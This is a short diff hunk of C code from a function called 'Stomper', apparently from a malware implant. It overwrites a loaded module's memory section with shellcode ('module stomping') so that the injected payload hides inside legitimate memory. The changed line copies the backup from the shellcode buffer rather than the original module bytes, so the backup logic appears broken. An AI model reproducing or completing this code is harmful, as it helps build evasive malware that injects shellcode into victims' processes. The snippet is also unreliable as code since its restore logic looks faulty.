@@ -75,7 +75,7 @@ VOID Stomper(
 
     Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, &Protect );
     
-    MmCopy( StompArgs.Backup, MmBase, StompArgs.Length );
+    MmCopy( StompArgs.Backup, ShellcodeBuffer, StompArgs.Length );
     MmCopy( MmBase, ShellcodeBuffer, ShellcodeSize );
 
     bCheck = Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect );
